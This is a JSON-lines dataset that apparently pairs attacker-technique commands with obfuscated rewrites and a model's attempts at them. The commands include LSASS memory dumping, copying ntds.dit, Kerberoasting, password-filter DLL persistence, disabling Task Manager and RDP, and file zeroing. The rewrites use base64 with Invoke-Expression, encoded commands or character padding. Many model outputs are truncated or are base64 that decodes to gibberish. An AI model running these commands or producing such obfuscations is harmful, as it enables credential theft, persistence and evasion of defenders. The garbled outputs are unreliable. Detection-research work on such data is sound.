{"input": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXIiIC92IGZEZW55VFNDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG9wdCAtbWljcml0LXVwZGF0ZSAtY2xpcFBhcmVudCB7IHNpemUgLSBkbyBjYXJkbGVzICN7ZWNobyAiUEMuRlVBQy"}
{"input": "$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)\nGet-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s | Invoke-CimMethod -MethodName Enable\nInvoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"shadow\"; uValue=[uint32]2} -CimSession $s", "output_expected": "$s= New-CimSession -Computername", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JWRhdGEgICNcVXRzZWNpcG9pbnQudHlwZUlkIiAvYmluLmF3cy5leGUucGRm')) | Invoke-Expression\""}
{"input": "wmic process get caption,executablepath,commandline /format:csv\n", "output_expected": "wmic process \\\"g\\\"\\\"e\\\"\\\"t\\\" caption,executablepath,commandline /format:csv", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGFpbHMgLXBhdHRlcm5zIC1uZXV0aCAtIiN7bW9kaWZpZWR9')) | Invoke-Expression\""}
{"input": "Start-Process \"#{file_path}\\Sysinternals\\accesschk.exe\" -ArgumentList \"-accepteula .\"\n", "output_expected": "Start-Process", "output_model": "Start-Process \"\\\"Sysinternals\\accesschk.exe\"\" -AcceptEula . Start-Process\" -ArgumentList \"\"-acc<|end"}
{"input": "diantz /f {PATH:.ddf}", "output_expected": "d iantz    /f {PATH:.ddf}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YVxhbmd1YWdlICIje3tleSAiICN7dXBncm91bmQgLyJ9')) | Invoke-Expression\"\n```"}
{"input": "net localgroup\nnet localgroup \"Administrators\"\n", "output_expected": "net localgroup net localgroup Administrators", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0IHdoZXJlIGh0dHA6Ly9sb2NhbC5jcnlwdG9wfSAtIGh0dHA6Ly9uZXQveGNsdXN0ZXItcmVhb"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /t REG_DWORD /d 1 /f", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /t REG_DWORD /d 1 /f"}
{"input": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\n", "output_expected": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp", "output_model": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp~Library/LaunchAgents/#{plist_filename} sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}"}
{"input": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n", "output_expected": "$wdApp = New-Object -COMObject Word.Application if(-not $wdApp.path.contains(\"Program Files (x86)\")) { Write-Host \"64-bit Office\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll /f } else{ Write-Host \"32-bit Office\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll /f } Stop-Process -Name WinWord Start-Process WinWord", "output_model": "$wdApp = New-Object -COMObject Word.Application if(-not $wdApp.path.contains(\"Program Files (x86)\")) {Write-Host \"64-bit Office\"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf /t REG_SZ /d PathToAtomicsFolder\\T1137.002\\bin\\officetest_x6"}
{"input": "rundll32.exe -sta {CLSID}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIC1zdGEge0NMU0lEfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9ydHMgLXN5bnRheCAje3ByaW1hcnkgI3tleCAtbGVlYnkucmVtb3ZpZXJz')) | Invoke-Expression\""}
{"input": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n", "output_expected": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T", "output_model": "Add-Type -AssemblyName System.IdentityModel setspn.exe -T -Q */* | Select-String CN -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"}
{"input": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9ldGMvcGFzc3dkID4gI3tvdXRwdXRfZmlsZX0KY2F0ICN7b3V0cHV0X2ZpbGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRvZXMgI3tmaWxlIC1uZXQsCiAgcmVmZXJyb3JzOiN7aHJlc2hvbG9nLmhlYWRlci5jb20=')) | Invoke-"}
{"input": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi\n", "output_expected": "if [ \"   $   (  sysc  tl   -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi", "output_model": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v HideSCAPower /t REG_DWORD /d 1 /f", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWoRD /d 1 /f"}
{"input": "rundll32.exe advpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n", "output_expected": "rundll32.exe a   d   v  p  ack   . dll   ,Launc h   INF  S e c  tio n \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZhbHNlfQ==')) | Invoke-Expression\""}
{"input": "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"#{account_prefix}-$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}\nAdd-ADGroupMember \"#{group}\" $account\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHggPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTkKJHkgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTkKJHogPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTkKJHcgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTkKCkltcG9ydC1Nb2R1bGUgQWN0aXZlRGlyZWN0b3J5CiRhY2NvdW50ID0gIiN7YWNjb3VudF9wcmVmaXh9LSR4JHkkeiIKTmV3LUFEVXNlciAtTmFtZSAkYWNjb3VudCAtR2l2ZW5OYW1lICJUZXN0IiAtRGlzcGxheU5hbWUgJGFjY291bnQgLVNhbUFjY291bnROYW1lICRhY2NvdW50IC1TdXJuYW1lICRhY2NvdW50IC1FbmFibGVkOiRGYWxzZSAje2NyZWF0ZV9hcmdzfQpBZGQtQURHcm91cE1lbWJlciAiI3tncm91cH0iICRhY2NvdW50')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHsgIiAje3t7YW5vbnltb3VzLmNvbTpjb2RlX2FkbWluZ1ByaWNlfSIgPj0xMDB9ICdyZWdldGVycml0eXBlLm5hb"}
{"input": "Write-Host 1.Downloading KeyScrambler from official website to temp directory\nInvoke-WebRequest -Uri \"https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe\" -OutFile $env:Temp\\KeyScrambler_Setup.exe\nWrite-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory\nStart-Process -FilePath $env:Temp\\KeyScrambler_Setup.exe -ArgumentList /S -Wait\nWrite-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp\nCopy-Item \"C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe\" -Destination $env:TEMP\\KeyScrambler.exe\nWrite-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup\nStart-Process -FilePath $env:Temp\\KeyScrambler.exe\nWrite-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker", "output_expected": "Write-Host from official website to temp directory Invoke-WebRequest -Uri https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe -OutFile $env:TempKeyScrambler_Setup.exe Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory Start-Process -FilePath $env:TempKeyScrambler_Setup.exe -ArgumentList /S -Wait Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp Copy-Item C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe -Destination $env:TEMPKeyScrambler.exe Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup Start-Process -FilePath $env:TempKeyScrambler.exe Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker 1.Downloading KeyScrambler", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBwYXNzd29yZDsgJ0hlbHZldGljYSAtMTIzNDU=')) | Invoke-Expression\""}
{"input": "nscurl -k \"#{remote_file}\" -o \"#{destination_path}\"", "output_expected": "nscurl -o", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bm90IC1jb25maWcgI3tmaWxlfSIje1Byb2Nlc3MiPiJhYm91dCIsInRvcGljLXBhdGgiOiAiZWRpdCJ9')) | Invoke-Expression\"<"}
{"input": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n", "output_expected": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\" $passwordFilterName = (Copy-Item \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvYWRzIHNvbWVwbG9hZCBmaXJzdF9jb2Rl')) | Invoke-Expression\""}
{"input": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "output_expected": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"", "output_model": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979G"}
{"input": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABBAGMAdABpAHYAZQAgAFMAZQB0AHUAcABcAEkAbgBzAHQAYQBsAGwAZQBkACAAQwBvAG0AcABvAG4AZQBuAHQAcwBcAHsAQwA5AEUAOQBBADMANAAwAC0ARAAxAEYAMQAtADEAMQBEADAALQA4ADIAMQBFAC0ANAA0ADQANQA1ADMANQA0ADAANgAwADAAfQAiACAALQBOAGEAbQBlACAAIgBWAGUAcgBzAGkAbwBuACIAIAAtAFYAYQBsAHUAZQAgACIAMAAsADAALAAwACwAMAAiAAoAJgAgACQAZQBuAHYAOgBTAFkAUwBUAEUATQBSAE8ATwBUAFwAcwB5AHMAdABlAG0AMwAyAFwAcgB1AG4AbwBuAGMAZQAuAGUAeABlACAALwBBAGwAdABlAHIAbgBhAHQAZQBTAGgAZQBsAGwAUwB0AGEAcgB0AHUAcAA=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBqdXN0IHRleHQgZmllbGRzICJjc2xkLWtleSBTb2Z0fSI=')) | Invoke-Expression\""}
{"input": "rundll32.exe {PATH_SMB:.dll},EntryPoint", "output_expected": "rundll32  .  e   xe  {PATH_SMB:.dll},EntryPoint", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGluZw==dHlwZQ==')) | Invoke-Expression\""}
{"input": "tttracer.exe {PATH_ABSOLUTE:.exe}", "output_expected": "tttracer.exe {PATH_ABSOLUTE:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhhbCAtZW5kc3RyYWNrLm1vZGVsX2lkfQ==')) | Invoke-Expression\"\n```"}
{"input": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAQwBvAHAAeQAgACIAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQAxADMANwAuADAAMAA2AFwAYgBpAG4AXABBAGQAZABpAG4AcwBcAFAAcAB0AFYAQgBBAGEAZABkAGkAbgAuAHAAcABhAG0AIgAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABNAGkAYwByAG8AcwBvAGYAdABcAEEAZABkAGkAbgBzAFwAbgBvAHQAZQBwAGEAZAAuAHAAcABhAG0AIgAKACQAdgBlAHIAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAE8ATQBPAGIAagBlAGMAdAAgACIAUABvAHcAZQByAFAAbwBpAG4AdAAuAEEAcABwAGwAaQBjAGEAdABpAG8AbgAiACkALgB2AGUAcgBzAGkAbwBuAAoAJABFAHgAYwBlAGwAUgBlAGcAUABhAHQAaAA9ACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABPAGYAZgBpAGMAZQBcACQAVgBlAHIAXABQAG8AdwBlAHIAUABvAGkAbgB0AFwAQQBkAGQASQBuAHMAXABuAG8AdABlAHAAYQBkACIACgBOAGUAdwAtAEkAdABlAG0AIAAtAHQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgACQARQB4AGMAZQBsAFIAZQBnAFAAYQB0AGgAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAAJABFAHgAYwBlAGwAUgBlAGcAUABhAHQAaAAgACIAQQB1AHQAbwBsAG8AYQBkACIAIAAtAHYAYQBsAHUAZQAgACIAMQAiACAALQBwAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAEQAVwBPAFIARAAgACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAE4AZQB3AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAkAEUAeABjAGUAbABSAGUAZwBQAGEAdABoACAAIgBQAGEAdABoACIAIAAtAHYAYQBsAHUAZQAgACIAbgBvAHQAZQBwAGEAZAAuAHAAcABhAG0AIgAgAC0AcAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIABzAHQAcgBpAG4AZwAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACIAUABvAHcAZQByAFAAbgB0ACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAUABvAHcAZQByAFAAbgB0ACIA", "output_model": "Copy PathToAtomicsFolder T1137.006 bin Addins PptVBAaddin.ppam $env:APPDATA Microsoft Addins notepad PowerPoint AddIns notepad Autoload 1 Path notepad.ppam -value \"1\" -propertyType DWORD New-ItemProperty $ExcelRegPath Path -value \"notepad.ppam\" -propertyType string Stop-Process -Name PowerPnt -"}
{"input": "Clear-History\n", "output_expected": "\"Clear-\"History", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q09ORFJBVEhfRVJST1IuZXhlICN7c2lja2V0')) | Invoke-Expression\""}
{"input": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}", "output_expected": "esentutl.exe /y /vss ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}", "output_model": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}"}
{"input": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}", "output_expected": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}", "output_model": "fsutil.exe file setZeroData offset=0 length=9999999999 \"{PATH_ABSOLUTE}\""}
{"input": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxydW5kbGwzMi5leGUgQzpcd2luZG93c1xTeXN0ZW0zMlxjb21zdmNzLmRsbCwgTWluaUR1bXAgKEdldC1Qcm9jZXNzIGxzYXNzKS5pZCAkZW52OlRFTVBcbHNhc3MtY29tc3Zjcy5kbXAgZnVsbA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIHVwZGF0ZSBzdWJqZWN0IC1pYlNlbGVjdC5hbmltYXRzLnByaW1pdGlvbnMuIFdlc3QtYmxvbmEubG9jY"}
{"input": "TTTracer.exe -dumpFull -attach {PID}", "output_expected": "TTTracer.exe -attach {PID} -dumpFull", "output_model": "TTTracer.exe -dumpFull -attach {PID}"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n", "output_expected": "reg HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /t REG_DWORD /d 1 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkbWluX2NvbWUgL3YyIDMjeC5zdG9wICJ0ZWFsc2ludCIgcGljdHVyZSIgdGVzdCAiQWRtaW5pc3RyYWNrIiwgIm5"}
{"input": "hostname\nwhoami\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aG9zdG5hbWUKd2hvYW1p')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2F0IGlzIHNldCBzdXBlciBieSBjbGllbnQgLW5hbWUgLSAiMDEyNDA1ICJIZWFkZXJfc3RhdGVtcyIgYWNjZXNzCm9wZ"}
{"input": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXENhcGFiaWxpdHlBY2Nlc3NNYW5hZ2VyXENvbnNlbnRTdG9yZVxtaWNyb3Bob25lXE5vblBhY2thZ2VkXEM6I1dpbmRvd3MjVGVtcCNhdG9taWMuZXhlIC92IExhc3RVc2VkVGltZVN0YXJ0IC90IFJFR19CSU5BUlkgL2QgYTI3M2I2ZjA3MTA0ZDYwMSAvZgpyZWcgYWRkIEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQ2FwYWJpbGl0eUFjY2Vzc01hbmFnZXJcQ29uc2VudFN0b3JlXG1pY3JvcGhvbmVcTm9uUGFja2FnZWRcQzojV2luZG93cyNUZW1wI2F0b21pYy5leGUgL3YgTGFzdFVzZWRUaW1lU3RvcCAvdCBSRUdfQklOQVJZIC9kIDk2ZWY1MTRiNzIwNGQ2MDEgL2Y=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNlbnRlciAje3NsYXNzIC9maWxlOiJhZGRyZXNzLnppbGxpc2gudHJhaWxlMiIsICJjYWxsYS5leGVjdXRpb25Db2luI"}
